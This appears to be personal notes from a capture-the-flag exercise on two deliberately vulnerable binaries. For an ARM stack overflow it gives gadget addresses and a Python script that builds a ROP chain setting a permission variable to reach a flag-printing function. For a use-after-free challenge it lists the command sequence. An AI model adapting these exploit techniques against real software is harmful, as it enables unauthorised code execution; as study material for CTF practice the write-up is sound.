Return Home
=================
Tried vmmap and found that stack was not executable.
Found a stack overflow at print_arg


Through gdb, it was found that
print_flag_if_permission is at 0x85d0
0x0006b004 contains the permission needed, which by default is 0, we need to make it non 0


using ropper on a.out
>ropper
>file a.out
>search /1/ str
>search /1/ pop

Gadget 2
=========
0x00008ea8: str r1, [r2]; bx lr
[r1]: any value not 0
[r2]: 0x0006b004 address of permission
[lr]: 0x85d0 address of print_flag_if_permission


Gadget 1
=========
0x00008534: pop {r0, r1, r2, r3, lr, pc};
[pc]: Gadget 2 address 0x00008ea8
[lr]: address of print_flag_if_permission


+++++++++++++++++p.py (Code to create the input file)
import struct

#pop {r0, r1, r2, r3, lr, pc};
GADGET_1 = 0x8534

#str r1, [r2]; bx lr;
GADGET_2 = 0X8EA8


PRINT_FLAG = 0x85d0

PERMISSIONS = 0x6b004
def writed():
    with open('/home/androidappre/Desktop/ctfrop/input', 'wb') as f:
        f.write(b'a'*68)
        g1 = struct.pack('<I', GADGET_1)
        f.write(g1)
        #pop {r0, r1, r2, r3, lr, pc};
        #f.write(b'f'*bef_d) #r0, r1, r2, r3 = 16 bytes
        r0 = struct.pack('<I', 0x1) # anything
        r1 = struct.pack('<I', 0x1) # anything but not 0 can already
        r2 = struct.pack('I', PERMISSIONS)
        r3 = struct.pack('<I', 0x1) # anything
        lr = struct.pack('<I', PRINT_FLAG)
        pc = struct.pack('<I', GADGET_2)

        f.write(r0)
        f.write(r1)
        f.write(r2)
        f.write(r3)
        f.write(lr) #lr

        f.write(pc) #pc gadget 2 address


        f.write(b'b'*32)

writed()



And now i am free
=================
Use after free exploit.

need to ensure the 32 byte  following service is not null.

auth aaaa
reset [Does not set pointer back to null)
service11111111112222222222333333333344
login



